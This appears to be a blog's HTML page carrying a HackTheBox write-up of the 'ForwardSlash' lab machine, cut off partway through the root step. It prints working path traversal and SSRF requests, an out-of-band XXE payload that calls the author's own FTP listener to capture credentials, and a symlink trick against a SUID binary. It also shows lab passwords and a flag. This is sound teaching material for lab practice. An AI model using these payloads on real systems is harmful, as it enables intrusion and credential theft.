<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ForwardSlash | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,hard"><meta name=description content="ForwardSlash HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/forwardslash/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/forwardslash/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ForwardSlash "><meta property="og:description" content="ForwardSlash HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/forwardslash/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-07-05T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/forwardslash/forwardslash.png"><meta name=twitter:title content="ForwardSlash "><meta name=twitter:description content="ForwardSlash HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"ForwardSlash ","item":"https://s4ch.github.io/writeups/hackthebox/forwardslash/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ForwardSlash ","name":"ForwardSlash ","description":"ForwardSlash HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","hard"],"articleBody":"≡ƒÆó Info Name: ForwardSlash Profile: www.hackthebox.eu Difficulty: Hard OS: Linux Points: 40 Overview TL;DR: There is a web application with a parameter vulnerable to file disclosure, directory traversal and SSRF (not LFI/RFI). Then we can exploit an OOB XXE over FTP to steal FTP credentials. Then with credential stuffing we land on the box via SSH. On the system we exploit a SUID binary to read a configuration file that leaks a database password. With credential stuffing again we can elevate to a more powerful user via SSH. Then we have to break a custom crypto algorithm to decrypt a ciphertext. The decrypted cyphertext gives the password of a LUKS container. Then we can mount the container with sudo permissions and get the root SSH private key.\nInstall tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap\tffuf curl burpsuite xxeserv peass haiti openssh Network Enumeration Let’s start by scanning port and services with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.80 scan initiated Fri Jun 12 13:17:07 2020 as: nmap -sSVC -p- -oA nmap_full 10.10.10.183 Nmap scan report for 10.10.10.183 Host is up (0.022s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA) | 256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA) |_ 256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Did not follow redirect to http://forwardslash.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 12 13:17:36 2020 -- 1 IP address (1 host up) scanned in 29.63 seconds If we try to reach http://10.10.10.183, we are redirected to http://forwardslash.htb\nSo let’s edit /etc/hosts to add this entry:\n1 10.10.10.183 forwardslash.htb HTTP discovery Let’s see what we have at http://forwardslash.htb/\nSo the site was defaced. The defacer is talking about XML so there must be a XXE and is also talking about Automatic FTP Logins.\nHTTP enumeration Let’s find if there are files hidden somewhere with [ffuf][ffuf]:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ ffuf -u http://forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fc 403 -e .txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://forwardslash.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response status: 403 ________________________________________________ . [Status: 200, Size: 1695, Words: 207, Lines: 42] note.txt [Status: 200, Size: 216, Words: 39, Lines: 5] :: Progress: [76534/76534]┬á:: Job [1/1] :: 1700 req/sec :: Duration: [0:00:45] :: Errors: 0 :: There is one:\n1 2 3 4 5 $ curl http://forwardslash.htb/note.txt Pain, we were hacked by some skids that call themselves the \"Backslash Gang\"... I know... That name... Anyway I am just leaving this note here to say that we still have that backup site so we should be fine. -chiv So if there is a backup site it may be online too. Let’s find it by bruteforcing virtual hosts with subdomains:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ ffuf -u http://10.10.10.183/ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -H 'Host: FUZZ.forwardslash.htb' -fs 1695 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.183/ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Header : Host: FUZZ.forwardslash.htb :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 1695 ________________________________________________ backup [Status: 200, Size: 1267, Words: 336, Lines: 40] :: Progress: [38267/38267]┬á:: Job [1/1] :: 708 req/sec :: Duration: [0:00:54] :: Errors: 0 :: So let’s add backup.forwardslash.htb to /etc/hosts too.\n1 10.10.10.183 backup.forwardslash.htb We are redirected to http://backup.forwardslash.htb/login.php\nThere is a login form. We can use the registration page to sign up.\nIf we sign up and log in, we are redirected to http://backup.forwardslash.htb/welcome.php\nHTTP exploitation: file disclosure \u0026 directory traversal The Change your Profile Picture! feature is disabled.\nBut that’s just from the HTML so let’s edit the DOM, remove the disabled attributes and send a request:\nBy doing a directory traversal on /etc/passwd we obtained a file disclosure:\n1 2 3 4 5 6 POST /profilepicture.php HTTP/1.1 Host: backup.forwardslash.htb ... Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt url=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin pain:x:1000:1000:pain:/home/pain:/bin/bash chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false HTTP exploitation: SSRF We can also see if there are any other pages:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $ ffuf -u http://backup.forwardslash.htb/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .txt,.php -fs 288 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://backup.forwardslash.htb/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt :: Extensions : .txt .php :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 :: Filter : Response size: 288 ________________________________________________ login.php [Status: 200, Size: 1267, Words: 336, Lines: 40] register.php [Status: 200, Size: 1490, Words: 426, Lines: 42] index.php [Status: 200, Size: 1267, Words: 336, Lines: 40] logout.php [Status: 200, Size: 1267, Words: 336, Lines: 40] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] api.php [Status: 200, Size: 127, Words: 22, Lines: 2] dev [Status: 403, Size: 65, Words: 6, Lines: 1] . [Status: 200, Size: 1267, Words: 336, Lines: 40] welcome.php [Status: 200, Size: 1267, Words: 336, Lines: 40] environment.php [Status: 200, Size: 1267, Words: 336, Lines: 40] reset-password.php [Status: 200, Size: 1267, Words: 336, Lines: 40] hof.php [Status: 200, Size: 1267, Words: 336, Lines: 40] :: Progress: [114801/114801]┬á:: Job [1/1] :: 1881 req/sec :: Duration: [0:01:01] :: Errors: 0 :: It seems there is a dev endpoint that dives us a HTTP 403. But even authenticated we can’t access http://backup.forwardslash.htb/dev/\nHopefully the url parameter is not only vulnerable to file disclosure and path traversal but also to SSRF (Server Side Request Forgery). Maybe locally this will be allowed, so let’s try teh following request in burp:\n1 2 3 4 5 6 POST /profilepicture.php HTTP/1.1 Host: backup.forwardslash.htb ... Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt url=http://backup.forwardslash.htb/dev/ Yes! We obtained the HTML code of the dev endpoint:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u003chtml\u003e \u003ch1\u003eXML Api Test\u003c/h1\u003e \u003ch3\u003eThis is our api test for when our new website gets refurbished\u003c/h3\u003e \u003cform action=\"/dev/index.php\" method=\"get\" id=\"xmltest\"\u003e \u003ctextarea name=\"xml\" form=\"xmltest\" rows=\"20\" cols=\"50\"\u003e\u003capi\u003e \u003crequest\u003etest\u003c/request\u003e \u003c/api\u003e \u003c/textarea\u003e \u003cinput type=\"submit\"\u003e \u003c/form\u003e \u003c/html\u003e It’s talking about XML and FTP login as said in the deface.\nLet’s try to send a default request to the XML api:\n1 2 3 4 5 6 POST /profilepicture.php HTTP/1.1 Host: backup.forwardslash.htb ... Cookie: PHPSESSID=mbmjmv76c2veso4c1ihneuh5bt url=http://backup.forwardslash.htb/dev/index.php?xml= Nothing fancy yet.\nHTTP exploitation: XXE We noticed in the HTML code the following structure:\n1 2 3 test So let’s try to forge a simple XXE payload using it:\n1 2 3 4 5 \u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE replace [\u003c!ENTITY xxe \"cyfun\"\u003e]\u003e \u0026xxe; So I tried to send something like that:\n1 url=http://backup.forwardslash.htb/dev/index.php?xml%3d\u003c?xml%20version%3d\"1.0\"%20?\u003e\u003c!DOCTYPE%20replace%20[\u003c!ENTITY%20xxe%20\"cyfun\"\u003e]\u003e%20%20%26xxe; But this doesn’t work. But let’s remember the FTP hint!\nMaybe the XXE is OOB (Out Of Band) only. In general, working with FTP for OOB is far better than HTTP as it wil allows us to retrieve the whole file rather than the 1st line. Here I don’t think we will retrieve files but rather credentials as it’s said there is a FTP autologin feature. So we won’t need a complex payload:\n1 2 3 4 5 6 7 8 9 \u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % ext SYSTEM \"ftp://10.10.15.32/\"\u003e %ext; ]\u003e dontcare Our payload will look like this:\n1 url=http://backup.forwardslash.htb/dev/index.php?xml%3d\u003c%3fxml%2520version%253d\"1.0\"%2520%3f\u003e\u003c!DOCTYPE%2520root%2520[\u003c!ENTITY%2520%25%2520ext%2520SYSTEM%2520\"ftp%3a//10.10.15.32/\"\u003e%2520%25ext%3b]\u003edontcare PS: even if burp automatically URL encode key character for us we need to double encore the key character in the xml payload for the request to work.\nBut before let’s start [xxeserv][xxeserv], a fake FTP server, then, when submitting the request we will receive the credentials:\n1 2 3 4 5 6 7 8 $ sudo xxeserv -p 21 [*] UNO Listening... 2020/07/05 19:32:51 [*] GO XXE FTP Server - Port: 21 2020/07/05 19:32:55 [*] Connection Accepted from [10.10.10.183:50146] USER: chiv PASS: N0bodyL1kesBack/ 2020/07/05 19:32:55 [x] Connection Closed 2020/07/05 19:32:55 [*] Closing FTP Connection Two important things were required here:\nrunning the FTP server on port 21 (eg. port 2121 was filtered) adding a leading slash to the request (eg. ftp://10.10.15.32/ works but ftp://10.10.15.32 not) Network exploitation: credential stuffing Let’s see if we can re-use the FTP credentials on SSH:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ ssh chiv@forwardslash.htb The authenticity of host 'forwardslash.htb (10.10.10.183)' can't be established. ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'forwardslash.htb,10.10.10.183' (ECDSA) to the list of known hosts. chiv@forwardslash.htb's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jul 5 17:42:11 UTC 2020 System load: 0.0 Processes: 196 Usage of /: 30.8% of 19.56GB Users logged in: 0 Memory usage: 19% IP address for ens33: 10.10.10.183 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 16 packages can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Jul 5 15:11:43 2020 from 10.10.14.230 chiv@forwardslash:~$ System enumeration Let’s see what is inside /var/backups/:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 chiv@forwardslash:~$ ls -lhA /var/backups/ total 804K -rw-r--r-- 1 root root 60K Mar 24 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 38K Mar 24 06:17 apt.extended_states.0 -rw-r--r-- 1 root root 4.1K Mar 6 14:17 apt.extended_states.1.gz -rw-r--r-- 1 root root 3.9K Mar 5 14:46 apt.extended_states.2.gz -rw------- 1 pain pain 526 Jun 21 2019 config.php.bak -rw-r--r-- 1 root root 437 Mar 5 14:07 dpkg.diversions.0 -rw-r--r-- 1 root root 207 Mar 5 14:47 dpkg.statoverride.0 -rw-r--r-- 1 root root 653K Mar 24 06:17 dpkg.status.0 -rw------- 1 root root 730 Mar 17 20:13 group.bak -rw------- 1 root shadow 604 Mar 17 20:13 gshadow.bak -r--r--r-- 1 root root 129 May 27 2019 note.txt -rw------- 1 root root 1.7K Mar 5 14:46 passwd.bak drwxrwx--- 2 root backupoperator 4.0K May 27 2019 recovery -rw------- 1 root shadow 1.2K Mar 6 14:21 shadow.bak There are:\nconfig.php.bak owned by pain note.txt which is world readable recovery folder owned by the backupoperator group The only thing we can read for now is note.txt:\n1 2 3 Chiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH. -Pain Let’s try to enumerate more with the help of linPEAS (from [PEASS][PEASS]).\nWe have /usr/share/peass/linPEAS/linpeas.sh, let’s just serve it via HTTP:\n1 2 3 4 $ ruby -run -e httpd /usr/share/peass/linPEAS/ -p 8888 [2020-07-05 20:13:39] INFO WEBrick 1.6.0 [2020-07-05 20:13:39] INFO ruby 2.7.1 (2020-03-31) [x86_64-linux] [2020-07-05 20:13:39] INFO WEBrick::HTTPServer#start: pid=117003 port=8888 Now let’s download it on the box:\n1 2 chiv@forwardslash:/tmp/cyfun$ wget http://10.10.15.32:8888/linpeas.sh chiv@forwardslash:/tmp/cyfun$ chmod u+x linpeas.sh In the SUID section we can see an unusual /usr/bin/backup.\n1 2 chiv@forwardslash:~$ ls -lh /usr/bin/backup -r-sr-xr-x 1 pain pain 14K Mar 6 10:06 /usr/bin/backup Privilege Escalation : from chiv to pain backup is owned by pain.\nLet’s try to run it:\n1 2 3 4 5 6 7 8 9 10 chiv@forwardslash:~$ backup ---------------------------------------------------------------------- Pain's Next-Gen Time Based Backup Viewer v0.1 NOTE: not reading the right file yet, only works if backup is taken in same second ---------------------------------------------------------------------- Current Time: 18:37:43 ERROR: 01430555472f086a6633fad6bfc18d98 Does Not Exist or Is Not Accessible By Me, Exiting... There is a hash in the error output, let’s identify the hash type with :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ haiti 01430555472f086a6633fad6bfc18d98 MD2 [JtR: md2] MD5 [HC: 0] [JtR: raw-md5] MD4 [HC: 900] [JtR: raw-md4] Double MD5 [HC: 2600] LM [HC: 3000] [JtR: lm] RIPEMD-128 [JtR: ripemd-128] Haval-128 [JtR: haval-128-4] Tiger-128 Skein-256(128) Skein-512(128) Lotus Notes/Domino 5 [HC: 8600] [JtR: lotus5] Skype [HC: 23] Snefru-128 [JtR: snefru-128] NTLM [HC: 1000] [JtR: nt] Domain Cached Credentials [HC: 1100] [JtR: mscach] Domain Cached Credentials 2 [HC: 2100] [JtR: mscach2] DNSSEC(NSEC3) [HC: 8300] RAdmin v2.x [HC: 9900] [JtR: radmin] It’s most likely a MD5 hash but we can’t crack it.\nAs it’s a Time Based Backup Viewer it’s maybe the hash of the timestamp.\n1 2 $ printf %s '18:37:43' | md5sum 01430555472f086a6633fad6bfc18d98 - Let’s write a script that will create a file like this.\n1 2 3 4 5 6 time=$(date +\"%H:%M:%S\") hash=$(printf %s $time | md5sum | cut -d ' ' -f 1) # create file echo 'cyfun test' \u003e $hash # call backup backup If we execute the script we have no error now and the file is read:\n1 2 3 4 5 6 7 8 9 10 chiv@forwardslash:/tmp/cyfun$ ./time.sh ---------------------------------------------------------------------- Pain's Next-Gen Time Based Backup Viewer v0.1 NOTE: not reading the right file yet, only works if backup is taken in same second ---------------------------------------------------------------------- Current Time: 18:51:46 cyfun test So we can read a file owned by pain now by modifying our scipt:\n1 2 3 4 5 6 time=$(date +\"%H:%M:%S\") hash=$(printf %s $time | md5sum | cut -d ' ' -f 1) # create file ln -s /var/backups/config.php.bak $hash # call backup backup Now we can read /var/backups/config.php.bak:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u003c?php /* Database credentials. Assuming you are running MySQL server with default setting (user 'root' with no password) */ define('DB_SERVER', 'localhost'); define('DB_USERNAME', 'pain'); define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704'); define('DB_NAME', 'site'); /* Attempt to connect to MySQL database */ $link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME); // Check connection if($link === false){ die(\"ERROR: Could not connect. \" . mysqli_connect_error()); } ?\u003e Again let’s try credential stuffing on SSH:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 $ ssh pain@forwardslash.htb pain@forwardslash.htb's password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jul 5 19:12:12 UTC 2020 System load: 0.0 Processes: 174 Usage of /: 30.8% of 19.56GB Users logged in: 1 Memory usage: 11% IP address for ens33: 10.10.10.183 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch 16 packages can be updated. 0 updates are security updates. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Thu Mar 5 14:22:04 2020 from 192.168.56.1 pain@forwardslash:~$ cat user.txt dd552dcd5a367ea132ee2f017dc5a02d Decrypting the ciphertext We can run some commands as root:\n1 2 3 4 5 6 7 8 pain@forwardslash:~/encryptorinator$ sudo -l Matching Defaults entries for pain on forwardslash: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pain may run the following commands on forwardslash: (root) NOPASSWD: /sbin/cryptsetup luksOpen * (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/ (root) NOPASSWD: /bin/umount ./mnt/ Let’s see what is in pain home directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 pain@forwardslash:~$ ls -lhA total 40K lrwxrwxrwx 1 pain root 9 Mar 6 09:43 .bash_history -\u003e /dev/null -rw-r--r-- 1 pain pain 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 pain pain 3.7K Apr 4 2018 .bashrc drwx------ 2 pain pain 4.0K Mar 5 14:22 .cache drwxr-xr-x 2 pain root 4.0K Mar 24 12:06 encryptorinator drwx------ 3 pain pain 4.0K Mar 5 14:22 .gnupg drwxrwxr-x 3 pain pain 4.0K Mar 6 14:23 .local -rw-r--r-- 1 pain root 256 Jun 3 2019 note.txt -rw-r--r-- 1 pain pain 807 Apr 4 2018 .profile drwx------ 2 pain pain 4.0K Mar 17 20:29 .ssh -rw------- 1 pain pain 33 Jul 5 18:34 user.txt There is a note file talking about a crypto software.\n1 2 3 4 5 6 7 8 pain@forwardslash:~$ cat note.txt Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go. -chiv pain@forwardslash:~$ ls -lhA encryptorinator/ total 8.0K -rw-r--r-- 1 pain root 165 Jun 3 2019 ciphertext -rw-r--r-- 1 pain root 931 Jun 3 2019 encrypter.py Also it seems that pain is in the backupoperator group.\n1 2 pain@forwardslash:~$ id uid=1000(pain) gid=1000(pain) groups=1000(pain),1002(backupoperator) So we can now see what is in /var/backups/recovery/:\n1 2 pain@forwardslash:~$ ls -lhA /var/backups/recovery/encrypted_backup.img -rw-r----- 1 root backupoperator 954M Mar 24 12:12 /var/backups/recovery/encrypted_backup.img An encrypted backup! We must take a look to the crypto-soft to break that.\nLet’s look a this ugly python script encrypter.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 def encrypt(key, msg): key = list(key) msg = list(msg) for char_key in key: for i in range(len(msg)): if i == 0: tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1]) else: tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1]) while tmp \u003e 255: tmp -= 256 msg[i] = chr(tmp) return ''.join(msg) def decrypt(key, msg): key = list(key) msg = list(msg) for char_key in reversed(key): for i in reversed(range(len(msg))): if i == 0: tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1])) else: tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1])) while tmp \u003c 0: tmp += 256 msg[i] = chr(tmp) return ''.join(msg) print encrypt('REDACTED', 'REDACTED') print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED')) It’s a custom block cipher, so the only things that matter is to find the key lenght and the first character of the key which much more simple than guessing the exact key. Maybe the beginning for the decrypted text will be messed up but with luck we won’t need it.\nLet’s download the ciphertext locally:\n1 $ scp pain@forwardslash.htb:/home/pain/encryptorinator/ciphertext ./ As I am more at ease with Ruby than with Python, I rewrote the decrypt() method in Ruby and then made a script to bruteforce an approximative key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 #!/usr/bin/env ruby def decrypt(key, msg) key = key.chars msg = msg.chars tmp = 0 key.reverse.each do |char_key| (0...msg.size).reverse_each do |i| if i == 0 tmp = msg[i].ord - (char_key.ord + msg[-1].ord) else tmp = msg[i].ord - (char_key.ord + msg[i-1].ord) end while tmp \u003c 0 tmp += 256 end msg[i] = tmp.chr end end return msg.join end ciphertext = File.binread('ciphertext') words = ['encrypt', 'key', 'backup', 'password'] found_key = false (1..100).each do |key_length| ('a'..'z').each do |c| guessed_key = c * key_length d = decrypt(guessed_key, ciphertext) if words.any? { |word| d.include?(word) } puts \"Approximate key: #{guessed_key}\" puts \"Partially decrypted text: #{d}\" found_key = true break end break if found_key end end Now let’s run it:\n1 2 3 $ ruby bf.rb Approximate key: ttttttttttttttttt Partially decrypted text: ∩┐╜$7C∩┐╜∩┐╜q8∩┐╜∩┐╜4∩┐╜l'you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf∩┐╜ The crypto part is not interesting me so I won’t develop the explanation more than that but you can take a look at IppSec video to see the reasoning.\nPrivilege Escalation : from pain to root 1 2 $ pain@forwardslash:~/encryptorinator$ file /var/backups/recovery/encrypted_backup.img /var/backups/recovery/encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf Now it’s pretty clear we have to mount the LUKS container with the password we just found.\nLet’s see the commands we can run as root again:\n1 2 3 4 5 6 7 8 pain@forwardslash:~/encryptorinator$ sudo -l Matching Defaults entries for pain on forwardslash: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pain may run the following commands on forwardslash: (root) 